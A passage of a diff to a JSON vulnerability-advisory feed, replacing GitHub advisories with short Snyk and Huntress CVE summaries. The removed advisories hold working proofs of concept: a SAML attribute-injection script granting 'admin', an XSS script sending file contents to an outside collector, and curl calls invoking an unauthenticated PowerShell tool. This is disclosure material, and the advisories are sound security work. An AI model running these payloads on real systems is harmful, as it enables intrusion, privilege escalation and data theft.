Value=\"{StatusCode}\"/></samlp:Status><saml:Assertion ID=\"{AssertionID}\" Version=\"2.0\" IssueInstant=\"{IssueInstant}\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"><saml:Issuer>{Issuer}</saml:Issuer><saml:Subject><saml:NameID Format=\"{NameIDFormat}\">{NameID}</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"{SubjectConfirmationDataNotOnOrAfter}\" Recipient=\"{SubjectRecipient}\" InResponseTo=\"{InResponseTo}\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"{ConditionsNotBefore}\" NotOnOrAfter=\"{ConditionsNotOnOrAfter}\"><saml:AudienceRestriction><saml:Audience>{Audience}</saml:Audience></saml:AudienceRestriction></saml:Conditions>{AttributeStatement}</saml:Assertion></samlp:Response>',\n  attributes: [\n    { name: 'mail', valueTag: 'user.email', nameFormat: 'urn:oasis:names:tc:SAML:2.0:attrname-format:basic', valueXsiType: 'xs:string' },\n    { name: 'injection', valueTag: 'user.injection', nameFormat: 'urn:oasis:names:tc:SAML:2.0:attrname-format:basic', valueXsiType: 'xs:string' },\n  ],\n};\n\nconst idp = IdentityProvider({\n  privateKey: readFileSync('./test/key/idp/privkey.pem'),\n  privateKeyPass: 'q9ALNhGT5EhfcRmp8Pg7e9zTQeP2x1bW',\n  isAssertionEncrypted: false,\n  metadata: readFileSync('./test/misc/idpmeta.xml'),\n  loginResponseTemplate,\n});\n\nconst sp = ServiceProvider({\n  privateKey: readFileSync('./test/key/sp/privkey.pem'),\n  privateKeyPass: 'VHOSp5RUiBcrsjrcAuXFwU1NKCkGA8px',\n  isAssertionEncrypted: false,\n  metadata: readFileSync('./test/misc/spmeta.xml'),\n});\n\nconst buildTemplate = (_idp: any, _sp: any, _binding: any, user: any) => (template: string) => {\n  const now = new Date();\n  const fiveMinutesLater = new Date(now.getTime() + 300_000);\n  const tvalue = {\n    ID: _idp.entitySetting.generateID(),\n    AssertionID: _idp.entitySetting.generateID(),\n    Destination: _sp.entityMeta.getAssertionConsumerService('post'),\n    Audience: _sp.entityMeta.getEntityID(),\n    SubjectRecipient: _sp.entityMeta.getAssertionConsumerService('post'),\n    NameIDFormat: 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress',\n    NameID: user.email,\n    Issuer: _idp.entityMeta.getEntityID(),\n    IssueInstant: now.toISOString(),\n    ConditionsNotBefore: now.toISOString(),\n    ConditionsNotOnOrAfter: fiveMinutesLater.toISOString(),\n    SubjectConfirmationDataNotOnOrAfter: fiveMinutesLater.toISOString(),\n    InResponseTo: 'request-id',\n    StatusCode: 'urn:oasis:names:tc:SAML:2.0:status:Success',\n    attrUserEmail: user.email,\n    attrUserInjection: user.injection,\n  };\n\n  return { id: tvalue.ID, context: libsaml.replaceTagsByValue(template, tvalue) };\n};\n\nasync function main() {\n  const injection = [\n    'safe',\n    '</saml:AttributeValue></saml:Attribute>',\n    '<saml:Attribute Name=\"role\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">',\n    '<saml:AttributeValue xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">admin</saml:AttributeValue>',\n    '</saml:Attribute>',\n    '<saml:Attribute Name=\"injection\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">',\n    '<saml:AttributeValue xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">safe'\n  ].join('');\n\n  const user = { email: 'user@esaml2.com', injection };\n  const { context: SAMLResponse } = await idp.createLoginResponse(\n    sp,\n    { extract: { request: { id: 'request-id' } } },\n    'post',\n    user,\n    buildTemplate(idp, sp, 'post', user)\n  );\n\n  const xml = util.base64Decode(SAMLResponse, true).toString();\n  console.log('--- Generated XML snippet ---');\n  console.log(xml.slice(xml.indexOf('<saml:AttributeStatement'), xml.indexOf('</saml:AttributeStatement>') + 26));\n\n  const { extract } = await sp.parseLoginResponse(idp, 'post', { body: { SAMLResponse } });\n\n  console.log('Parsed attributes:', extract.attributes);\n}\n\nmain().catch(err => {\n  console.error('PoC failed:', err?.message || err);\n  process.exitCode = 1;\n});\n```\n\n**Run:**\n\n```\n  npm install --legacy-peer-deps\n  npx ts-node poc/attribute_injection.ts\n```\n\n## Impact \n\nA normal user can inject arbitrary attributes (e.g., `role=admin`) into a signed assertion and have them parsed by `sp.parseLoginResponse()`. This can grant elevated privileges in SPs that trust SAML attributes.",
-      "first_seen": "2026-05-21T19:07:38.169377+00:00",
+      "canonical_id": "CVE-2019-10744",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] On July 2nd, 2019, Snyk published a high severity prototype pollution security vulnerability (CVE-2019-10744) affecting all versions of lodash, as the result of an on-going analysis lead by the Snyk security research team.",
+      "first_seen": "2026-05-21T20:09:05.749459+00:00",
       "frameworks": [
-        "npm"
+        "snyk"
       ],
       "key_kind": "cve",
       "languages": [],
-      "last_seen": "2026-05-21T19:07:38.169377+00:00",
+      "last_seen": "2026-05-21T20:09:05.749459+00:00",
       "merged_sources": [
-        "ghsa"
+        "rss_feeds"
       ],
-      "proactive_only": false,
+      "proactive_only": true,
       "raw_records_count": 1,
       "references": [
-        "https://github.com/advisories/GHSA-34r5-q4jw-r36m",
-        "https://github.com/tngan/samlify/security/advisories/GHSA-34r5-q4jw-r36m"
-      ],
-      "severity": "high",
-      "source_count": 1,
-      "title": "samlify: XML Injection in AttributeValue Allows Privilege Escalation in Signed SAML Assertions"
-    },
-    {
-      "canonical_id": "CVE-2026-46492",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-80",
-        "CWE-87"
-      ],
-      "description": "### Summary\nA cross-site scripting (XSS) vulnerability exists in the application\u2019s Markdown rendering logic. When user-supplied Markdown content is rendered, embedded raw HTML\u2014including <script> tags\u2014is processed and injected into the resulting page without sanitization, allowing arbitrary JavaScript execution in the context of the affected domain.\n\n### Details\nAn attacker can craft malicious Markdown content containing <script> tags or event handlers (e.g., <img onerror=...>). When this Markdown is viewed or previewed, the embedded JavaScript executes in the victim\u2019s browser.\n\n### Vulnerable Components\nconfig.js \u2192 markdownIt: { html: true } (Lines 26\u201330)\nThe Markdown renderer is explicitly configured to allow raw HTML.\n\nlib/markd.js (Lines 33\u201358)\nRenders Markdown content without sanitizing HTML, allowing unsafe tags and attributes to remain in the output.\n\nlib/pages/template.html\nThe rendered Markdown is injected into the HTML template using <%= markdown %> without sanitization or output encoding.\n\n### PoC\nCreate a pwn.md \n```\n# Hello\n\n<script>\n  fetch('/etc/passwd', { credentials: 'include' })\n    .then(r => r.text())\n    .then(t => fetch('https://79evxsw3m08qfyvxluebgl0pyg47szgo.oastify.com/exfil', { method: 'POST', body: t }));\n</script>\n\n```\nOpen it on browser.\n<img width=\"944\" height=\"238\" alt=\"image\" src=\"https://github.com/user-attachments/assets/cd9e1396-9f4b-4a4b-bc2a-d7530c0c00ac\" />\nView the HTTP request in Burp Collaborator.\n<img width=\"1328\" height=\"468\" alt=\"image\" src=\"https://github.com/user-attachments/assets/9faa65ad-73ec-42d0-9ce3-ea78b15294d8\" />\n\n\n### Impact\nSuccessful exploitation allows an attacker to execute arbitrary JavaScript in the victim\u2019s browser, leading to:\n- Session hijacking\n- Account takeover\n- Credential theft\n- Defacement or injection of malicious content\n- Exfiltration of sensitive data via API tokens, CSRF tokens, or user information\n\nThis affects all users who can view Markdown content within the application.",
-      "first_seen": "2026-05-21T19:07:38.169231+00:00",
-      "frameworks": [
-        "npm"
-      ],
-      "key_kind": "cve",
-      "languages": [],
-      "last_seen": "2026-05-21T19:07:38.169231+00:00",
-      "merged_sources": [
-        "ghsa"
-      ],
-      "proactive_only": false,
-      "raw_records_count": 1,
-      "references": [
-        "https://github.com/advisories/GHSA-32q2-hhr5-6qvv",
-        "https://github.com/commenthol/md-fileserver/security/advisories/GHSA-32q2-hhr5-6qvv"
-      ],
-      "severity": "high",
-      "source_count": 1,
-      "title": "md-fileserver: Stored/Reflected XSS when viewing Markdown (raw HTML allowed)"
-    },
-    {
-      "canonical_id": "CVE-2026-8596",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-312"
-      ],
-      "description": "## Summary\nAmazon SageMaker Python SDK is an open-source library for training and deploying machine learning models on Amazon SageMaker. An issue exists where, under certain circumstances, the ModelBuilder/Serve component stores an HMAC signing key in cleartext as a container environment variable, which is returned in plaintext by SageMaker describe APIs.\n\n## Impact\nWhen using ModelBuilder to build and deploy models with affected model servers (TorchServe, Multi-Model Server, TensorFlow Serving, SMD, or Triton), the SDK generates an HMAC secret key for model artifact integrity verification and stores it as the SAGEMAKER_SERVE_SECRET_KEY environment variable in the SageMaker model container configuration. This environment variable is returned in plaintext by the DescribeModel, DescribeEndpointConfig, and DescribeModelPackage APIs. A remote authenticated actor with permissions to call these describe APIs and S3 write access to the model artifact path could extract the key, forge valid integrity signatures for specially crafted model artifacts, and achieve code execution in inference containers with the SageMaker execution role's IAM permissions.\n\n**Impacted versions:** >= v2.199.0 AND <= v2.257.1, >= v3.0.0 AND <= v3.7.1\n\n## Patches\nThis issue has been addressed in Amazon SageMaker Python SDK v2.257.2 and v3.8.0. AWS recommend upgrading to the latest version and rebuilding any models previously created with ModelBuilder using the updated SDK. Models created with affected versions may still have the HMAC key stored in their container environment variables until they are rebuilt with the patched SDK. Ensure any forked or derivative code is patched to incorporate the new fixes.\n\n## Workarounds\nIf upgrading is not immediately possible, users can manually remove the SAGEMAKER_SERVE_SECRET_KEY environment variable from existing SageMaker models by recreating the model without this variable in the container environment configuration.\n\n## References\nIf there any questions or comments about this advisory, contact AWS Security via the [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.",
-      "first_seen": "2026-05-21T19:07:38.169273+00:00",
-      "frameworks": [
-        "pip"
-      ],
-      "key_kind": "cve",
-      "languages": [],
-      "last_seen": "2026-05-21T19:07:38.169273+00:00",
-      "merged_sources": [
-        "ghsa"
-      ],
-      "proactive_only": false,
-      "raw_records_count": 1,
-      "references": [
-        "https://aws.amazon.com/security/security-bulletins/2026-031-aws",
-        "https://github.com/advisories/GHSA-7hh5-prp2-mfh5",
-        "https://github.com/aws/sagemaker-python-sdk/releases/tag/v2.257.2",
-        "https://github.com/aws/sagemaker-python-sdk/releases/tag/v3.8.0",
-        "https://github.com/aws/sagemaker-python-sdk/security/advisories/GHSA-7hh5-prp2-mfh5",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-8596"
-      ],
-      "severity": "high",
-      "source_count": 1,
-      "title": "Cleartext storage of HMAC signing key in Amazon SageMaker Python SDK ModelBuilder/Serve path"
-    },
-    {
-      "canonical_id": "CVE-2026-8597",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-354"
-      ],
-      "description": "## Summary\nAmazon SageMaker Python SDK is an open-source library for training and deploying machine learning models on Amazon SageMaker. An issue exists where, under certain circumstances, the Triton inference handler deserializes model artifacts without performing integrity verification, allowing specially crafted pickle payloads to execute arbitrary code.\n\n## Impact\nWhen using ModelBuilder with the Triton inference server, the Triton handler did not perform integrity verification before deserializing model artifacts. A remote authenticated actor with S3 write access to the model artifact path could replace model files with a crafted payload that would execute automatically on the next container lifecycle event, achieving code execution with the SageMaker execution role's IAM permissions.\n\n\n**Impacted versions:** >= v2.199.0 AND <= v2.257.1, >= v3.0.0 AND <= v3.7.1\n\n## Patches\nThis issue has been addressed in Amazon SageMaker Python SDK v2.257.2 and v3.8.0. The Triton inference handler now performs integrity verification before deserializing model artifacts. AWS recommend upgrading to the latest version and rebuilding any Triton models previously created with ModelBuilder using the updated SDK. Ensure any forked or derivative code is patched to incorporate the new fixes.\n\n## Workarounds\nIf upgrading is not immediately possible, users should restrict S3 write access to model artifact paths to only trusted principals and monitor for unintended modifications to files in model artifact S3 locations.\n\n## References\nIf there any questions or comments about this advisory, contact AWS Security via [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.",
-      "first_seen": "2026-05-21T19:07:38.169254+00:00",
-      "frameworks": [
-        "pip"
-      ],
-      "key_kind": "cve",
-      "languages": [],
-      "last_seen": "2026-05-21T19:07:38.169254+00:00",
-      "merged_sources": [
-        "ghsa"
-      ],
-      "proactive_only": false,
-      "raw_records_count": 1,
-      "references": [
-        "https://aws.amazon.com/security/security-bulletins/2026-031-aws",
-        "https://github.com/advisories/GHSA-rq6v-x3j8-7qgf",
-        "https://github.com/aws/sagemaker-python-sdk/releases/tag/v2.257.2",
-        "https://github.com/aws/sagemaker-python-sdk/releases/tag/v3.8.0",
-        "https://github.com/aws/sagemaker-python-sdk/security/advisories/GHSA-rq6v-x3j8-7qgf",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-8597"
+        "https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/"
       ],
       "severity": "medium",
       "source_count": 1,
-      "title": "Amazon SageMaker Python SDK is missing integrity verification in its Triton inference handler"
+      "title": "Snyk research team discovers severe prototype pollution security vulnerabilities affecting all versions of lodash"
     },
     {
-      "canonical_id": "GHSA-763j-3p5v-jfc6",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-22"
-      ],
-      "description": "### Summary\nDuring device acquisition, `getPathToLocalCopy()` constructs local filesystem paths for downloaded APKs using a filename component extracted by `extractFileName()`. The extraction splits on `==/` and takes the remainder without sanitization. If a compromised device returns a crafted APK path containing traversal sequences, `filepath.Join` resolves them, allowing the file to be written outside the intended `apks/` directory.\n\nPractical exploitability is limited because Android enforces strict package path formats under `/data/app/` and does not allow apps to register paths containing traversal sequences. Rated Informational as a defense-in-depth concern.\n\n### Impact\nAn attacker with control of the connected device could potentially write files outside the expected output directory on the acquisition workstation, leading to arbitrary file overwrite with attacker-controlled content.\n\n### Patched version\n[1.8.3](https://github.com/mvt-project/androidqf/releases/tag/v1.8.3)\n\n### Credits\n- This issue was identified during a security assessment conducted by 0xche. \n- An additional vulnerability was independently identified by @0x0v1",
-      "first_seen": "2026-05-21T19:07:38.169424+00:00",
+      "canonical_id": "CVE-2019-11249",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] Today we want to talk about two recent Kubernetes vulnerabilities (CVE-2019-11247 and CVE-2019-11249) and how you can address them.",
+      "first_seen": "2026-05-21T20:09:05.747654+00:00",
       "frameworks": [
-        "go"
+        "snyk"
       ],
-      "key_kind": "sid",
+      "key_kind": "cve",
       "languages": [],
-      "last_seen": "2026-05-21T19:07:38.169424+00:00",
+      "last_seen": "2026-05-21T20:09:05.747654+00:00",
       "merged_sources": [
-        "ghsa"
+        "rss_feeds"
       ],
-      "proactive_only": false,
+      "proactive_only": true,
       "raw_records_count": 1,
       "references": [
-        "https://github.com/advisories/GHSA-763j-3p5v-jfc6",
-        "https://github.com/mvt-project/androidqf/releases/tag/v1.8.3",
-        "https://github.com/mvt-project/androidqf/security/advisories/GHSA-763j-3p5v-jfc6"
+        "https://snyk.io/blog/how-to-detect-and-fix-kubernetes-access-restriction-vulnerability-cve-2019-11249/"
       ],
-      "severity": "low",
+      "severity": "medium",
       "source_count": 1,
-      "title": "androidqf: APK download Path Traversal in device APK paths"
+      "title": "How to Detect and Remediate Kubernetes Vulnerability CVE-2019-11249"
     },
     {
-      "canonical_id": "GHSA-vrxg-gm77-7q5g",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-306"
-      ],
-      "description": "HTTP transports expose unauthenticated PowerShell control with wildcard CORS\n\nThere is an issue in the SSE and Streamable HTTP transport modes. The default stdio mode is not affected, but the documented HTTP modes expose the MCP control plane without authentication and add wildcard CORS handling around it. The same server exposes the `PowerShell` tool, which executes caller-controlled commands as the Windows user running Windows-MCP.\n\nRelevant source:\n\n- `src/windows_mcp/__main__.py:37-42`: `_http_middleware()` installs `OptionsMiddleware` and `CORSMiddleware` with `allow_origins=[\"*\"]`, `allow_methods=[\"*\"]`, and `allow_headers=[\"*\"]`.\n- `src/windows_mcp/__main__.py:45-72`: `OptionsMiddleware` responds to every `OPTIONS` request with wildcard `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, and `Access-Control-Allow-Headers`.\n- `src/windows_mcp/__main__.py:75-113`: `_build_mcp()` constructs `FastMCP(name=\"windows-mcp\", ...)` without an auth provider.\n- `src/windows_mcp/__main__.py:139-151`: both `sse` and `streamable-http` call `mcp.run(...)` with that middleware and no application-level auth/security settings.\n- `src/windows_mcp/tools/shell.py:10-24`: registers the `PowerShell` tool and passes caller-controlled `command` to `PowerShellExecutor.execute_command`.\n- `src/windows_mcp/desktop/powershell.py:176-204`: executes that command through PowerShell `-EncodedCommand`.\n- `README.md:421-424` and `433-434`: documents the HTTP transports and describes Streamable HTTP as network-accessible HTTP streaming.\n\nIn an affected configuration, a client that can reach `http://localhost:8000/mcp` can initialize an MCP session and invoke `tools/call` for `PowerShell`. The issue is not just that PowerShell is powerful; it is that the HTTP control plane around that tool is unauthenticated and configured with wildcard CORS.\n\n## Root cause\n\nThe HTTP transport entry points compose two independent design decisions that fail-open together: the FastMCP instance is built without any authentication provider, and the middleware stack installs blanket wildcard CORS (`allow_origins=*`, `allow_methods=*`, `allow_headers=*`) that explicitly permits cross-origin browsers and any non-browser HTTP client to reach the MCP control plane. Either one alone would be a partial defense; together, the unauthenticated control plane is reachable from arbitrary origins, with no host-validation, no token check, and no DNS-rebinding mitigation between an attacker's request and the registered `PowerShell` tool. The structural fix is to require an auth provider (token, mTLS, or local-only secret handshake) on the HTTP transports and to scope CORS to a specific operator-configured allowlist rather than applying wildcard policy to a tool surface that includes shell execution.\n\n## Auth boundary violated\n\n**Boundary:** Network trust domain (an unauthenticated remote/cross-origin caller is treated as if it were a trusted local MCP client with rights to invoke privileged shell tools).\n\n**Respected at:** stdio transport path (`src/windows_mcp/__main__.py` stdio branch) \u2014 the default transport relies on parent-process pipe ownership for caller identity, which is a real OS-level boundary.\n\n**Violated at:** `src/windows_mcp/__main__.py:139-151` (SSE and Streamable HTTP branches call `mcp.run(...)` with the wildcard-CORS middleware installed at `:37-42` and no auth provider attached at `:75-113`). The boundary is silently dropped: there is no code path between the inbound HTTP request and `tools/call` for `PowerShell` (`src/windows_mcp/tools/shell.py:10-24` \u2192 `src/windows_mcp/desktop/powershell.py:176-204`) that asserts caller identity or origin.\n\nMinimal protocol proof from a matching FastMCP 3.2.4 harness with the same middleware posture:\n\n```text\n$ curl -i -s -X OPTIONS 'http://127.0.0.1:18123/mcp/' \\\n  -H 'Origin: https://attacker.example' \\\n  -H 'Access-Control-Request-Method: POST' \\\n  -H 'Access-Control-Request-Headers: content-type,mcp-session-id'\n\nHTTP/1.1 200 OK\naccess-control-allow-origin: *\naccess-control-allow-methods: *\naccess-control-allow-headers: *\n\n$ curl -i -s 'http://127.0.0.1:18123/mcp' \\\n  -H 'Origin: https://attacker.example' \\\n  -H 'Content-Type: application/json' \\\n  -H 'Accept: application/json, text/event-stream' \\\n  --data '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-06-18\",\"capabilities\":{},\"clientInfo\":{\"name\":\"evil-page\",\"version\":\"1\"}}}'\n\nHTTP/1.1 200 OK\ncontent-type: text/event-stream\nmcp-session-id: c67be0098b7643eb961b2fd0185ee043\naccess-control-allow-origin: *\n\n$ curl -i -s 'http://127.0.0.1:18123/mcp' \\\n  -H 'Origin: https://attacker.example' \\\n  -H 'Mcp-Session-Id: c67be0098b7643eb961b2fd0185ee043' \\\n  -H 'Content-Type: application/json' \\\n  -H 'Accept: application/json, text/event-stream' \\\n  --data '{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"PowerShell\",\"arguments\":{\"command\":\"calc.exe\",\"timeout\":30}}}'\n\nHTTP/1.1 200 OK\ncontent-type: text/event-stream\nmcp-session-id: c67be0098b7643eb961b2fd0185ee043\naccess-control-allow-origin: *\n\nevent: message\ndata: {\"jsonrpc\":\"2.0\",\"id\":2,\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"executed: calc.exe\"}],\"structuredContent\":{\"result\":\"executed: calc.exe\"},\"isError\":false}}\n```\n\n## Impact\n\nFor affected HTTP-transport deployments, successful exploitation gives arbitrary PowerShell execution as the user running Windows-MCP. There is an important browser caveat: current Chrome/Edge Local Network Access / Private Network Access behavior may block or prompt for public-site-to-localhost requests because this middleware does not return `Access-Control-Allow-Private-Network: true`. The exposure still applies to same-origin/private-origin contexts, browsers or apps without that enforcement, user-approved local-network prompts, browser extensions, and non-browser HTTP clients.\n\nSuggested fix: require authentication for HTTP transports, remove wildcard CORS from MCP control endpoints, restrict origins to explicit trusted clients, and enable/propagate transport security settings such as host validation. If unauthenticated HTTP is retained for development, I would make it an explicit unsafe flag and add regression tests for cross-origin `OPTIONS`, `initialize`, and `tools/call`.",
-      "first_seen": "2026-05-21T19:07:38.169643+00:00",
+      "canonical_id": "CVE-2019-13354",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] On July 5th, 2019, the CVE-2019-13354 security advisory was published for a malicious version of the strong_password Ruby gem which allows for remote code execution in applications bundling the vulnerable dependency.",
+      "first_seen": "2026-05-21T20:09:05.749455+00:00",
       "frameworks": [
-        "pip"
+        "snyk"
       ],
-      "key_kind": "sid",
+      "key_kind": "cve",
       "languages": [],
-      "last_seen": "2026-05-21T19:07:38.169643+00:00",
+      "last_seen": "2026-05-21T20:09:05.749455+00:00",
       "merged_sources": [
-        "ghsa"
+        "rss_feeds"
       ],
-      "proactive_only": false,
+      "proactive_only": true,
       "raw_records_count": 1,
       "references": [
-        "https://github.com/CursorTouch/Windows-MCP/security/advisories/GHSA-vrxg-gm77-7q5g",
-        "https://github.com/advisories/GHSA-vrxg-gm77-7q5g"
+        "https://snyk.io/blog/ruby-gem-strong_password-found-to-contain-remote-code-execution-code-in-a-malicious-version-further-strengthening-worries-of-growth-in-supply-chain-attacks/"
       ],
-      "severity": "high",
+      "severity": "medium",
       "source_count": 1,
-      "title": "Windows-MCP: HTTP transports expose unauthenticated PowerShell control with wildcard CORS"
+      "title": "Concerns of supply-chain attacks amplify as remote code execution was found in Ruby gem strong_password"
+    },
+    {
+      "canonical_id": "CVE-2019-14379",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] On July 29th, 2019 a high severityDeserialization of Untrusted Data vulnerability (CVE-2019-14379,CVE-2019-14439) affecting all versions of com.fasterxml.jackson.core:jackson-databind up to 2.9.9.2 was published.",
+      "first_seen": "2026-05-21T20:09:05.749187+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.749187+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/jackson-deserialization-vulnerability/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Jackson Deserialization Vulnerability"
+    },
+    {
+      "canonical_id": "CVE-2019-5736",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] A security flaw discovered by Adam Iwaniuk and Borys Pop\u0142awski and found in open source software runC was disclosed on February 11th, 2019 and described in CVE-2019-5736.",
+      "first_seen": "2026-05-21T20:09:05.750340+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.750340+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/a-serious-security-flaw-in-runc-can-result-in-root-privilege-escalation-in-docker-and-kubernetes/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "A serious security flaw in runC can result in root privilege escalation in Docker and Kubernetes"
+    },
+    {
+      "canonical_id": "CVE-2021-4034",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] The Pwnkit vulnerability (CVE-2021-4034) disclosed in Jan 2022 has existed since 2009, but can now be exploited in the wild. Secure your projects with Snyk.",
+      "first_seen": "2026-05-21T20:09:05.740192+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.740192+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/pwnkit-linux-exploit-cve-2021-4034/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Analyzing the PwnKit local privilege escalation exploit"
+    },
+    {
+      "canonical_id": "CVE-2021-40444",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress is monitoring a new threat against Windows OS and Microsoft Office products (CVE-2021-40444). The MSHTML engine is vulnerable to arbitrary code execution.",
+      "first_seen": "2026-05-21T20:08:57.678146+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.678146+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/cybersecurity-advisory-hackers-are-exploiting-cve-2021-40444"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Threat Advisory: Hackers Are Exploiting CVE-2021-40444 | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2021-44228",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Our team is currently investigating CVE-2021-44228, a critical vulnerability that\u2019s affecting a Java logging package.",
+      "first_seen": "2026-05-21T20:08:57.677943+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.677947+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 2,
+      "references": [
+        "https://www.huntress.com/blog/critical-rce-vulnerability-log4j-cve-2021-44228",
+        "https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Critical RCE Vulnerability: log4j - CVE-2021-44228 | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2021-44832",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] This new CVE-2021-44832 security vulnerability is affecting versions up to 2.17.0, which was previously thought to be fixed. This vulnerability is similar in nature to CVE-2021-4104 which affected the 1.x branch of Log4j.",
+      "first_seen": "2026-05-21T20:09:05.740625+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.740625+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/new-log4j-2-17-1-fixes-cve-2021-44832-remote-code-execution-but-its-not-as-bad-as-it-sounds/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "New Log4j 2.17.1 fixes CVE-2021-44832 remote code execution (but it\u2019s not as bad as it sounds)"
+    },
+    {
+      "canonical_id": "CVE-2021-45046",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] It has been discovered that Log4j version 2.15.0 is still susceptible to arbitrary code execution (CVE-2021-45046) in certain circumstances. Upgrade to 2.16.0.",
+      "first_seen": "2026-05-21T20:09:05.740774+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.740774+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/log4j-2-15-vulnerability-cve-2021-45046-critical-ace/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Log4j 2.15 vulnerability CVE-2021-45046 upgraded to a critical severity arbitrary code execution"
+    },
+    {
+      "canonical_id": "CVE-2021-45105",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] Overnight, it was disclosed by Apache that Log4j version 2.16 is also vulnerable by way of a Denial of Service attack with the impact being a full application crash, the severity for this is classified as High (7.5).",
+      "first_seen": "2026-05-21T20:09:05.740749+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.740749+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/log4j-2-16-vulnerability-cve-2021-45105-discovered/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Log4j 2.16 High Severity Vulnerability (CVE-2021-45105) Discovered"
+    },
+    {
+      "canonical_id": "CVE-2022-0847",
+      "composite_confidence": 0.4,
+      "cwe": [],
